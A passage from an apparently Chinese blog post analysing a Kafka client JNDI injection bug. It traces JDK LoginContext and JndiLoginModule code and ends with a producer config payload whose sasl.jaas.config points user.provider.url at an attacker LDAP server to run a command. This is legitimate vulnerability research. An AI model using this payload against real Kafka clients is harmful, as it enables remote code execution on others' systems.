((Boolean)methods[mIndex].invoke</span><br><span class="line">                            (moduleStack[i].<span class="keyword">module</span>, args)).booleanValue();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (status == <span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// if SUFFICIENT, return if no prior REQUIRED errors</span></span><br><span class="line">                <span class="keyword">if</span> (!methodName.equals(ABORT_METHOD) &amp;&amp;</span><br><span class="line">                    !methodName.equals(LOGOUT_METHOD) &amp;&amp;</span><br><span class="line">                    moduleStack[i].entry.getControlFlag() ==</span><br><span class="line">                AppConfigurationEntry.LoginModuleControlFlag.SUFFICIENT &amp;&amp;</span><br><span class="line">                    firstRequiredError == <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// clear state</span></span><br><span class="line">                    clearState();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (debug != <span class="literal">null</span>)</span><br><span class="line">                        debug.println(methodName + <span class="string">&quot; SUFFICIENT success&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (debug != <span class="literal">null</span>)</span><br><span class="line">                    debug.println(methodName + <span class="string">&quot; success&quot;</span>);</span><br><span class="line">                success = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (debug != <span class="literal">null</span>)</span><br><span class="line">                    debug.println(methodName + <span class="string">&quot; ignored&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException nsme) &#123;</span><br><span class="line">            <span class="type">MessageFormat</span> <span class="variable">form</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageFormat</span>(ResourcesMgr.getString</span><br><span class="line">                    (<span class="string">&quot;unable.to.instantiate.LoginModule.module.because.it.does.not.provide.a.no.argument.constructor&quot;</span>));</span><br><span class="line">            Object[] source = &#123;moduleStack[i].entry.getLoginModuleName()&#125;;</span><br><span class="line">            throwException(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">LoginException</span>(form.format(source)));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException ie) &#123;</span><br><span class="line">            throwException(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">LoginException</span>(ResourcesMgr.getString</span><br><span class="line">                    (<span class="string">&quot;unable.to.instantiate.LoginModule.&quot;</span>) +</span><br><span class="line">                    ie.getMessage()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">            throwException(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">LoginException</span>(ResourcesMgr.getString</span><br><span class="line">                    (<span class="string">&quot;unable.to.find.LoginModule.class.&quot;</span>) +</span><br><span class="line">                    cnfe.getMessage()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException iae) &#123;</span><br><span class="line">            throwException(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">LoginException</span>(ResourcesMgr.getString</span><br><span class="line">                    (<span class="string">&quot;unable.to.access.LoginModule.&quot;</span>) +</span><br><span class="line">                    iae.getMessage()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ite) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// failure cases</span></span><br><span class="line"></span><br><span class="line">            LoginException le;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ite.getCause() <span class="keyword">instanceof</span> PendingException &amp;&amp;</span><br><span class="line">                methodName.equals(LOGIN_METHOD)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// XXX</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// if a module&#x27;s LOGIN_METHOD threw a PendingException</span></span><br><span class="line">                <span class="comment">// then immediately throw it.</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// when LoginContext is called again,</span></span><br><span class="line">                <span class="comment">// the module that threw the exception is invoked first</span></span><br><span class="line">                <span class="comment">// (the module list is not invoked from the start).</span></span><br><span class="line">                <span class="comment">// previously thrown exception state is still present.</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// it is assumed that the module which threw</span></span><br><span class="line">                <span class="comment">// the exception can have its</span></span><br><span class="line">                <span class="comment">// LOGIN_METHOD invoked twice in a row</span></span><br><span class="line">                <span class="comment">// without any commit/abort in between.</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// in all cases when LoginContext returns</span></span><br><span class="line">                <span class="comment">// (either via natural return or by throwing an exception)</span></span><br><span class="line">                <span class="comment">// we need to call clearState before returning.</span></span><br><span class="line">                <span class="comment">// the only time that is not true is in this case -</span></span><br><span class="line">                <span class="comment">// do not call throwException here.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> (PendingException)ite.getCause();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ite.getCause() <span class="keyword">instanceof</span> LoginException) &#123;</span><br><span class="line"></span><br><span class="line">                le = (LoginException)ite.getCause();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ite.getCause() <span class="keyword">instanceof</span> SecurityException) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// do not want privacy leak</span></span><br><span class="line">                <span class="comment">// (e.g., sensitive file path in exception msg)</span></span><br><span class="line"></span><br><span class="line">                le = <span class="keyword">new</span> <span class="title class_">LoginException</span>(<span class="string">&quot;Security Exception&quot;</span>);</span><br><span class="line">                le.initCause(<span class="keyword">new</span> <span class="title class_">SecurityException</span>());</span><br><span class="line">                <span class="keyword">if</span> (debug != <span class="literal">null</span>) &#123;</span><br><span class="line">                    debug.println</span><br><span class="line">                        (<span class="string">&quot;original security exception with detail msg &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;replaced by new exception with empty detail msg&quot;</span>);</span><br><span class="line">                    debug.println(<span class="string">&quot;original security exception: &quot;</span> +</span><br><span class="line">                            ite.getCause().toString());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// capture an unexpected LoginModule exception</span></span><br><span class="line">                java.io.<span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StringWriter();</span><br><span class="line">                ite.getCause().printStackTrace</span><br><span class="line">                                            (<span class="keyword">new</span> <span class="title class_">java</span>.io.PrintWriter(sw));</span><br><span class="line">                sw.flush();</span><br><span class="line">                le = <span class="keyword">new</span> <span class="title class_">LoginException</span>(sw.toString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (moduleStack[i].entry.getControlFlag() ==</span><br><span class="line">                AppConfigurationEntry.LoginModuleControlFlag.REQUISITE) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (debug != <span class="literal">null</span>)</span><br><span class="line">                    debug.println(methodName + <span class="string">&quot; REQUISITE failure&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// if REQUISITE, then immediately throw an exception</span></span><br><span class="line">                <span class="keyword">if</span> (methodName.equals(ABORT_METHOD) ||</span><br><span class="line">                    methodName.equals(LOGOUT_METHOD)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (firstRequiredError == <span class="literal">null</span>)</span><br><span class="line">                        firstRequiredError = le;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    throwException(firstRequiredError, le);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (moduleStack[i].entry.getControlFlag() ==</span><br><span class="line">                AppConfigurationEntry.LoginModuleControlFlag.REQUIRED) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (debug != <span class="literal">null</span>)</span><br><span class="line">                    debug.println(methodName + <span class="string">&quot; REQUIRED failure&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// mark down that a REQUIRED module failed</span></span><br><span class="line">                <span class="keyword">if</span> (firstRequiredError == <span class="literal">null</span>)</span><br><span class="line">                    firstRequiredError = le;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (debug != <span class="literal">null</span>)</span><br><span class="line">                    debug.println(methodName + <span class="string">&quot; OPTIONAL failure&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// mark down that an OPTIONAL module failed</span></span><br><span class="line">                <span class="keyword">if</span> (firstError == <span class="literal">null</span>)</span><br><span class="line">                    firstError = le;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// we went thru all the LoginModules.</span></span><br><span class="line">    <span class="keyword">if</span> (firstRequiredError != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// a REQUIRED module failed -- return the error</span></span><br><span class="line">        throwException(firstRequiredError, <span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (success == <span class="literal">false</span> &amp;&amp; firstError != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// no module succeeded -- return the first error</span></span><br><span class="line">        throwException(firstError, <span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (success == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="comment">// no module succeeded -- all modules were IGNORED</span></span><br><span class="line">        throwException(<span class="keyword">new</span> <span class="title class_">LoginException</span></span><br><span class="line">            (ResourcesMgr.getString(<span class="string">&quot;Login.Failure.all.modules.ignored&quot;</span>)),</span><br><span class="line">            <span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// success</span></span><br><span class="line"></span><br><span class="line">        clearState();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>com.sun.security.auth.module#login()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-19.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">login</span><span class="params">()</span> <span class="keyword">throws</span> LoginException &#123;</span><br><span class="line">	<span class="comment">//userProvider不能为空</span></span><br><span class="line">    <span class="keyword">if</span> (userProvider不能为空 == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LoginException</span></span><br><span class="line">            (<span class="string">&quot;Error: Unable to locate JNDI user provider&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//groupProvider不能为空</span></span><br><span class="line">    <span class="keyword">if</span> (groupProvider == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LoginException</span></span><br><span class="line">            (<span class="string">&quot;Error: Unable to locate JNDI group provider&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] user provider: &quot;</span> +</span><br><span class="line">                            userProvider);</span><br><span class="line">        System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] group provider: &quot;</span> +</span><br><span class="line">                            groupProvider);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// attempt the authentication</span></span><br><span class="line">	<span class="comment">//tryFirstPass为true进入</span></span><br><span class="line">    <span class="keyword">if</span> (tryFirstPass) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// attempt the authentication by getting the</span></span><br><span class="line">            <span class="comment">// username and password from shared state</span></span><br><span class="line">            <span class="comment">//存在JNDI注入</span></span><br><span class="line">            attemptAuthentication(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// authentication succeeded</span></span><br><span class="line">            succeeded = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;tryFirstPass succeeded&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LoginException le) &#123;</span><br><span class="line">            <span class="comment">// authentication failed -- try again below by prompting</span></span><br><span class="line">            cleanState();</span><br><span class="line">            <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;tryFirstPass failed with:&quot;</span> +</span><br><span class="line">                            le.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	<span class="comment">//useFirstPass为true</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (useFirstPass) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// attempt the authentication by getting the</span></span><br><span class="line">            <span class="comment">// username and password from shared state</span></span><br><span class="line">            <span class="comment">//存在JNDI注入</span></span><br><span class="line">            attemptAuthentication(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// authentication succeeded</span></span><br><span class="line">            succeeded = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;useFirstPass succeeded&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LoginException le) &#123;</span><br><span class="line">            <span class="comment">// authentication failed</span></span><br><span class="line">            cleanState();</span><br><span class="line">            <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;useFirstPass failed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> le;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// attempt the authentication by prompting for the username and pwd</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        attemptAuthentication(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// authentication succeeded</span></span><br><span class="line">       succeeded = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;regular authentication succeeded&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (LoginException le) &#123;</span><br><span class="line">        cleanState();</span><br><span class="line">        <span class="keyword">if</span> (debug) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;\t\t[JndiLoginModule] &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;regular authentication failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> le;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>com.sun.security.auth.module#attemptAuthentication()</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-20.png"
+                      alt="img"
+                ></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">attemptAuthentication</span><span class="params">(<span class="type">boolean</span> getPasswdFromSharedState)</span></span><br><span class="line"><span class="keyword">throws</span> LoginException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">encryptedPassword</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// first get the username and password</span></span><br><span class="line">    <span class="comment">//若getPasswdFromSharedState为true代码进行运行，若为false则进入catch,不存在JNDI注入</span></span><br><span class="line">    getUsernamePassword(getPasswdFromSharedState);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// get the user&#x27;s passwd entry from the user provider URL</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">iCtx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="comment">//JNDI注入</span></span><br><span class="line">        ctx = (DirContext)iCtx.lookup(userProvider);</span><br><span class="line"></span><br><span class="line">        <span class="type">SearchControls</span> <span class="variable">controls</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SearchControls</span>();</span><br><span class="line">        NamingEnumeration&lt;SearchResult&gt; ne = ctx.search(<span class="string">&quot;&quot;</span>,</span><br><span class="line">                                    <span class="string">&quot;(uid=&quot;</span> + username + <span class="string">&quot;)&quot;</span>,</span><br><span class="line">                                    controls);</span><br><span class="line">        <span class="keyword">if</span> (ne.hasMore()) &#123;</span><br><span class="line">            <span class="type">SearchResult</span> <span class="variable">result</span> <span class="operator">=</span> ne.next();</span><br><span class="line">            </span><br><span class="line">            <span class="type">Attributes</span> <span class="variable">attributes</span> <span class="operator">=</span> result.getAttributes();</span><br><span class="line">    	....</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用链如下：</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="E:/ExportMD-rectify-pics/image/kafkaimage-21.png"
+                      alt="img"
+                ></p>
+<p>综上若进行JNDI注入需满足一下条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//security.protocol为SASL_SSL  SASL_PLAINTEXT</span><br><span class="line">props.put(&quot;security.protocol&quot;,&quot;SASL_SSL&quot;);</span><br><span class="line">bootstrap.servers不为空，为空解析报错</span><br><span class="line">props.put(&quot;bootstrap.servers&quot;, &quot;localhost:9092&quot;);</span><br><span class="line">key.serializer不为空，且可被解析</span><br><span class="line">props.put(&quot;key.serializer&quot;, &quot;org.apache.kafka.common.serialization.StringSerializer&quot;);</span><br><span class="line">value.serializer不为空，且可被解析</span><br><span class="line">props.put(&quot;value.serializer&quot;, &quot;org.apache.kafka.common.serialization.StringSerializer&quot;);</span><br><span class="line">//sasl.jaas.config为com.sun.security.auth.module.JndiLoginModule最终invoke至此类login()方法</span><br><span class="line">//useFirstPass或tryFirstPass为true</span><br><span class="line">//serviceName不为空</span><br><span class="line">//group.provider.url不为空</span><br><span class="line">//required user.provider.url为JNDI注入恶意地址</span><br><span class="line">props.put(&quot;sasl.jaas.config&quot;,&quot;com.sun.security.auth.module.JndiLoginModule &quot; +</span><br><span class="line">        &quot;required user.provider.url=\&quot;ldap://192.168.0.104:1389/Basic/Command/calc\&quot; &quot; +</span><br><span class="line">        &quot;useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; &quot; +</span><br><span class="line">        &quot;group.provider.url=\&quot;xxx\&quot;;&quot;);</span><br></pre></td></tr></table></figure>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">Kafka命令执行漏洞一</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">白给</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2023-04-24 22:45:18</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2023/04/24/Kafka命令执行漏洞一/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">#漏洞分析</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/04/24/Kafka%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%BA%8C-Apache-Druid-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Kafka命令执行漏洞二-Apache Druid 代码执行漏洞</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81kafka"><span class="nav-number">1.</span> <span class="nav-text">一、kafka</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">1.3.</span> <span class="nav-text">影响版本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">二、漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%9D%E8%B5%96"><span class="nav-number">2.1.</span> <span class="nav-text">依赖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">2.2.</span> <span class="nav-text">payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">白给</a>
+            
+        </div>
+        
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+            <div class="deploy-info info-item">
+                
+                    本站由 <span class="tooltip" data-content="GitHub Pages"><img src="/images/deploy-provider/github.png"></span> 提供部署服务
+                
+            </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
